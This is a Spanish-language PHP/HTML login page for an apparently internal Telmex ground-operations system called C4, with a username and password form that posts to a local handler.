<!DOCTYPE html>
<html>
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <title>Telmex Operaciones Terrestres - C4</title>
    <link href="min/plugin-min.css" type="text/css" rel="stylesheet">
    <link href="min/custom-min.css" type="text/css" rel="stylesheet" >
    <link rel="stylesheet" href="css/custum.css">
    <?php include_once 'variables.php'; echo $var_script; ?>
</head>
<body>
    <div id="login-wrapper">
        <h1>Bienvenido a Telmex <span>C4</span></h1>
         <div class="inner">
            <form id="homeLoading" method="post" action="c4.php">
                <span class="error">Nombre de usuario o contraseña incorrectos</span>
                <div class="content">
                <p>Por favor registrate para validar tus datos.</p>
                <input type="text" name="usuario" id="usr" onChange="this.value=validar(this.value)" class="caja"  maxlength="20" placeholder="Usuario:" />
                <input type="password" name="clave" id="pwd" onChange="this.value=validar(this.value)"  class="caja" maxlength="20" placeholder="Contraseña:" />
                <div class="button-holder">
                    <button type="submit" value="Ingresar" class="btn waves-effect waves-light red darken-1">
                        Ingresar
                        <i class="mdi-content-send right white-text"></i>
                    </button>
                </div>
            </form>
            <div class="etiqueta"></div>
            <div id="resultados"></div>
         </div>
        </div>
    </div>
    <div id="notificaciones"></div>
    <script src="js/jquery.min.js" charset="UTF-8"></script>
    <script src="js/materialize.min.js" charset="UTF-8"></script>
    <script src="js/mapa.js" charset="UTF-8"></script>
</body>
</html>
